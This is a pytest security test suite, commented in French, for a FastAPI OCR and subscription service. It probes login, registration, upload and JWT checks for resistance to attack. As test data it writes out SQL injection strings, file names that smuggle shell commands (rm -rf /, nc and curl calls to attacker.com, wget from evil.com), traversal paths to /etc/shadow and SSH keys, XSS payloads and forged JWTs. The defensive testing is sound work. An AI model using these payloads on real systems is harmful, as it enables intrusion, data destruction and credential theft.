"""
Tests de sécurité contre les injections et uploads malveillants - Protection des revenus critiques
Ces tests protègent contre les attaques qui pourraient compromettre le service ou voler des données.
"""

import pytest
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
import tempfile
import os
import json
from PIL import Image
import subprocess
import base64

from app.main import app


class TestSQLInjectionProtection:
    """Tests de protection contre les injections SQL"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_login_sql_injection_attempts(self, client):
        """CRITIQUE: Tentatives d'injection SQL dans login"""
        sql_injection_payloads = [
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "admin' UNION SELECT * FROM users --",
            "admin' AND (SELECT COUNT(*) FROM users) > 0 --",
            "admin'; INSERT INTO users VALUES('hacker', 'password') --",
            "' OR 1=1 #",
            "' OR 'x'='x",
            "1' OR '1'='1' /*",
        ]
        
        for payload in sql_injection_payloads:
            login_data = {
                "email": payload,
                "password": "any_password"
            }
            
            response = client.post("/api/auth/login", json=login_data)
            
            # Toutes les tentatives d'injection doivent échouer
            assert response.status_code in [400, 401, 422], f"Injection SQL non bloquée: {payload}"
            
            # Vérifier qu'aucune donnée sensible n'est retournée
            if response.status_code != 422:  # Validation error is OK
                data = response.json()
                sensitive_keywords = ["password", "hash", "secret", "token", "admin"]
                response_text = json.dumps(data).lower()
                
                for keyword in sensitive_keywords:
                    assert keyword not in response_text, f"Données sensibles exposées avec: {payload}"

    def test_registration_sql_injection_attempts(self, client):
        """CRITIQUE: Tentatives d'injection SQL dans registration"""
        injection_emails = [
            "test@domain.com'; DROP TABLE users; --",
            "test@domain.com' OR 1=1 --",
            "admin@test.com' UNION SELECT password FROM users --"
        ]
        
        for email in injection_emails:
            registration_data = {
                "email": email,
                "password": "ValidPassword123!"
            }
            
            response = client.post("/api/auth/register", json=registration_data)
            
            # L'injection doit être bloquée
            assert response.status_code in [400, 422], f"Injection SQL registration non bloquée: {email}"

    def test_user_search_sql_injection(self, client):
        """CRITIQUE: Injection SQL dans recherche utilisateurs"""
        # Si il y a un endpoint de recherche d'utilisateurs
        injection_queries = [
            "' UNION SELECT password FROM users WHERE email='admin@test.com' --",
            "'; SELECT * FROM user_profiles; --",
            "' OR 1=1 ORDER BY id --"
        ]
        
        for query in injection_queries:
            # Tester différents endpoints qui pourraient exister
            test_endpoints = [
                f"/api/users/search?q={query}",
                f"/api/profiles?search={query}",
            ]
            
            for endpoint in test_endpoints:
                response = client.get(endpoint)
                
                # 404 est OK (endpoint n'existe pas), mais pas 200 avec des données
                if response.status_code == 200:
                    data = response.json()
                    # Vérifier qu'aucune donnée utilisateur n'est exposée
                    assert not isinstance(data, list) or len(data) == 0, f"Données exposées: {endpoint}"


class TestCommandInjectionProtection:
    """Tests de protection contre les injections de commandes"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_filename_command_injection(self, client):
        """CRITIQUE: Injection de commandes via noms de fichiers"""
        malicious_filenames = [
            "test.png; rm -rf /",
            "test.png && cat /etc/passwd",
            "test.png | nc attacker.com 4444",
            "test.png; wget http://evil.com/malware",
            "$(curl http://attacker.com/steal)",
            "`id`",
            "; echo 'pwned' > /tmp/pwned.txt;",
        ]
        
        for filename in malicious_filenames:
            # Créer un fichier image valide
            image = Image.new("RGB", (100, 100), color="red")
            temp_file = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            image.save(temp_file.name, "PNG")
            
            try:
                with open(temp_file.name, 'rb') as f:
                    files = {"file": (filename, f, "image/png")}
                    response = client.post("/api/ocr/upload", files=files)
                
                # La requête doit être rejetée ou traitée sécuritairement
                assert response.status_code in [400, 422, 413], f"Command injection non bloquée: {filename}"
                
            finally:
                os.unlink(temp_file.name)

    def test_file_content_command_injection(self, client):
        """CRITIQUE: Injection via contenu de fichier"""
        # Créer un fichier avec du contenu malveillant dans les métadonnées
        malicious_content = b"""
        %PDF-1.4
        1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
        2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
        3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]
        /Contents 4 0 R>>endobj
        4 0 obj<</Length 44>>stream
        ; rm -rf / ; echo "System compromised"
        endstream
        endobj
        xref
        0 5
        trailer<</Size 5/Root 1 0 R>>
        startxref
        173
        %%EOF
        """
        
        temp_file = tempfile.NamedTemporaryFile(suffix=".pdf", delete=False)
        temp_file.write(malicious_content)
        temp_file.close()
        
        try:
            with open(temp_file.name, 'rb') as f:
                files = {"file": ("malicious.pdf", f, "application/pdf")}
                response = client.post("/api/ocr/upload", files=files)
            
            # Le fichier malveillant doit être rejeté ou traité sécuritairement
            assert response.status_code in [400, 422, 413, 500]
            
        finally:
            os.unlink(temp_file.name)

    def test_path_traversal_attempts(self, client):
        """CRITIQUE: Tentatives de path traversal"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "../../../../home/user/.ssh/id_rsa",
            "../app/config.py",
            "../../.env",
        ]
        
        for path in malicious_paths:
            # Tenter d'uploader avec des chemins malveillants
            response = client.post(
                "/api/ocr/upload",
                files={"file": (path, b"malicious content", "text/plain")}
            )
            
            # Les tentatives de path traversal doivent être bloquées
            assert response.status_code in [400, 422, 413], f"Path traversal non bloqué: {path}"


class TestFileUploadSecurityTesting:
    """Tests de sécurité pour les uploads de fichiers"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_executable_file_upload_prevention(self, client):
        """CRITIQUE: Prévention d'upload de fichiers exécutables"""
        executable_files = [
            ("malware.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("script.bat", b"@echo off\nformat C: /y", "text/plain"),
            ("shell.sh", b"#!/bin/bash\nrm -rf /", "text/plain"),
            ("virus.com", b"Malicious COM file", "application/octet-stream"),
            ("trojan.scr", b"Screen saver trojan", "application/octet-stream"),
        ]
        
        for filename, content, content_type in executable_files:
            response = client.post(
                "/api/ocr/upload",
                files={"file": (filename, content, content_type)}
            )
            
            # Tous les exécutables doivent être rejetés
            assert response.status_code in [400, 422, 413, 415], f"Exécutable non bloqué: {filename}"

    def test_zip_bomb_protection(self, client):
        """CRITIQUE: Protection contre les zip bombs"""
        # Créer un contenu très répétitif (simule une zip bomb décompressée)
        zip_bomb_content = b"0" * 1024 * 1024  # 1MB de zéros (compresse énormément)
        
        temp_file = tempfile.NamedTemporaryFile(suffix=".txt", delete=False)
        temp_file.write(zip_bomb_content)
        temp_file.close()
        
        try:
            with open(temp_file.name, 'rb') as f:
                files = {"file": ("zipbomb.txt", f, "text/plain")}
                response = client.post("/api/ocr/upload", files=files)
            
            # Le fichier très répétitif doit être traité avec prudence
            # Peut être accepté mais avec des limites de traitement
            assert response.status_code in [200, 400, 413, 422]
            
        finally:
            os.unlink(temp_file.name)

    def test_polyglot_file_detection(self, client):
        """CRITIQUE: Détection de fichiers polyglots"""
        # Fichier qui est à la fois PDF et HTML
        polyglot_content = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
<html><script>alert('XSS')</script></html>"""
        
        temp_file = tempfile.NamedTemporaryFile(suffix=".pdf", delete=False)
        temp_file.write(polyglot_content)
        temp_file.close()
        
        try:
            with open(temp_file.name, 'rb') as f:
                files = {"file": ("polyglot.pdf", f, "application/pdf")}
                response = client.post("/api/ocr/upload", files=files)
            
            # Fichiers polyglots doivent être traités avec prudence
            if response.status_code == 200:
                data = response.json()
                # Vérifier qu'aucun script n'est exécuté
                response_text = json.dumps(data).lower()
                assert "script" not in response_text
                assert "alert" not in response_text
            
        finally:
            os.unlink(temp_file.name)

    def test_image_with_embedded_scripts(self, client):
        """CRITIQUE: Images avec scripts embarqués"""
        # Créer une image avec métadonnées suspectes
        image = Image.new("RGB", (100, 100), color="green")
        
        # Ajouter des métadonnées malveillantes (simulé)
        temp_file = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
        image.save(temp_file.name, "JPEG")
        
        # Injecter du contenu malveillant dans le fichier
        with open(temp_file.name, 'ab') as f:
            f.write(b'<script>document.location="http://evil.com"</script>')
        
        try:
            with open(temp_file.name, 'rb') as f:
                files = {"file": ("malicious.jpg", f, "image/jpeg")}
                response = client.post("/api/ocr/upload", files=files)
            
            # L'image avec script doit être traitée sécuritairement
            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data).lower()
                
                # Vérifier qu'aucun script n'est dans la réponse
                assert "script" not in response_text
                assert "document.location" not in response_text
            
        finally:
            os.unlink(temp_file.name)

    def test_oversized_file_protection(self, client):
        """CRITIQUE: Protection contre les fichiers surdimensionnés"""
        # Créer un fichier de 100MB (trop gros)
        large_content = b"X" * (100 * 1024 * 1024)  # 100MB
        
        temp_file = tempfile.NamedTemporaryFile(suffix=".txt", delete=False)
        temp_file.write(large_content)
        temp_file.close()
        
        try:
            with open(temp_file.name, 'rb') as f:
                files = {"file": ("huge.txt", f, "text/plain")}
                response = client.post("/api/ocr/upload", files=files)
            
            # Le fichier trop gros doit être rejeté
            assert response.status_code in [413, 400, 422], "Fichier surdimensionné non bloqué"
            
        finally:
            os.unlink(temp_file.name)


class TestXSSAndInjectionInResponses:
    """Tests de protection XSS et injection dans les réponses"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_xss_in_error_messages(self, client):
        """CRITIQUE: Protection XSS dans les messages d'erreur"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
        ]
        
        for payload in xss_payloads:
            # Tenter d'injecter XSS via email
            response = client.post("/api/auth/login", json={
                "email": payload,
                "password": "test"
            })
            
            if response.status_code != 422:  # Skip validation errors
                data = response.json()
                response_text = json.dumps(data)
                
                # Vérifier que le payload XSS est échappé ou supprimé
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text
                assert "onload=" not in response_text

    def test_script_injection_in_filenames_response(self, client):
        """CRITIQUE: Injection de script via noms de fichiers dans réponses"""
        malicious_filename = '<script>alert("pwned")</script>.png'
        
        # Créer un fichier image valide avec nom malveillant
        image = Image.new("RGB", (50, 50), color="blue")
        temp_file = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
        image.save(temp_file.name, "PNG")
        
        try:
            with open(temp_file.name, 'rb') as f:
                files = {"file": (malicious_filename, f, "image/png")}
                response = client.post("/api/ocr/upload", files=files)
            
            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data)
                
                # Le nom de fichier malveillant doit être échappé
                assert "<script>" not in response_text
                assert "alert(" not in response_text
            
        finally:
            os.unlink(temp_file.name)

    def test_html_injection_in_ocr_results(self, client):
        """CRITIQUE: Injection HTML dans les résultats OCR"""
        # Créer une image qui pourrait produire du HTML malveillant via OCR
        # (Simulé car difficile à créer réellement)
        
        with patch('app.services.ocr_unified.pytesseract.image_to_string') as mock_ocr:
            # Simuler OCR retournant du HTML malveillant
            mock_ocr.return_value = '<script>alert("OCR XSS")</script><b>Text</b>'
            
            image = Image.new("RGB", (100, 100), color="white")
            temp_file = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            image.save(temp_file.name, "PNG")
            
            try:
                with open(temp_file.name, 'rb') as f:
                    files = {"file": ("test.png", f, "image/png")}
                    response = client.post("/api/ocr/upload", files=files)
                
                if response.status_code == 200:
                    data = response.json()
                    response_text = json.dumps(data)
                    
                    # Le HTML malveillant doit être échappé
                    assert "<script>" not in response_text
                    assert "alert(" not in response_text
                
            finally:
                os.unlink(temp_file.name)


class TestAuthenticationBypassAttempts:
    """Tests de tentatives de contournement d'authentification"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_jwt_manipulation_attempts(self, client):
        """CRITIQUE: Tentatives de manipulation de JWT"""
        import jwt
        from datetime import datetime, timedelta
        
        # Différentes tentatives de manipulation
        manipulation_attempts = [
            # Token avec signature modifiée
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdEB0ZXN0LmNvbSIsImV4cCI6OTk5OTk5OTk5OX0.FAKE_SIGNATURE",
            
            # Token avec algorithme "none"
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoiYWRtaW5AdGVzdC5jb20iLCJpc19hZG1pbiI6dHJ1ZX0.",
            
            # Token complètement malformé
            "not.a.jwt.token",
            
            # Token expiré
            jwt.encode({
                "user_id": "expired@test.com",
                "exp": datetime.utcnow() - timedelta(hours=1)
            }, "wrong-key", algorithm="HS256"),
        ]
        
        for token in manipulation_attempts:
            headers = {"Authorization": f"Bearer {token}"}
            response = client.get("/api/payment/check-subscription", headers=headers)
            
            data = response.json()
            
            # Toutes les manipulations doivent échouer
            assert data.get("is_pro") is False
            assert data.get("reason") in ["no_token", "no_user"]

    def test_privilege_escalation_attempts(self, client):
        """CRITIQUE: Tentatives d'élévation de privilèges"""
        import jwt
        from datetime import datetime, timedelta
        
        # Tentative d'injecter des privilèges via le token
        malicious_payload = {
            "user_id": "normal@test.com",
            "email": "normal@test.com",
            "is_admin": True,  # Tentative d'escalade
            "is_pro": True,    # Tentative d'accès Pro gratuit
            "quota_bypass": True,
            "exp": datetime.utcnow() + timedelta(hours=1)
        }
        
        # Même avec la bonne clé, les privilèges doivent venir du serveur
        with patch('app.services.auth_light.SECRET_KEY', 'test-secret-key'):
            malicious_token = jwt.encode(malicious_payload, 'test-secret-key', algorithm="HS256")
            
            headers = {"Authorization": f"Bearer {malicious_token}"}
            
            # Mock des données utilisateur côté serveur (non-Pro)
            user_data = {
                "email": "normal@test.com",
                "scans_used": 0,
                "scans_limit": 5,
                "is_pro": False  # Réelle données serveur
            }
            
            with patch('app.services.auth_light.USE_REDIS', True):
                with patch('app.services.auth_light.redis_client') as mock_redis:
                    mock_redis.get.return_value = json.dumps(user_data)
                    
                    response = client.get("/api/payment/check-subscription", headers=headers)
                    data = response.json()
                    
                    # Les privilèges doivent venir des données serveur, pas du token
                    assert data["is_pro"] is False
                    assert data["scans_limit"] == 5

    def test_session_fixation_attempts(self, client):
        """CRITIQUE: Tentatives de fixation de session"""
        # Tenter d'utiliser un token prédéterminé
        fixed_session_token = "fixed_token_attempt_123456"
        
        headers = {"Authorization": f"Bearer {fixed_session_token}"}
        response = client.get("/api/payment/check-subscription", headers=headers)
        
        data = response.json()
        
        # Le token fixé ne doit pas être accepté
        assert data["is_pro"] is False
        assert data["reason"] == "no_user"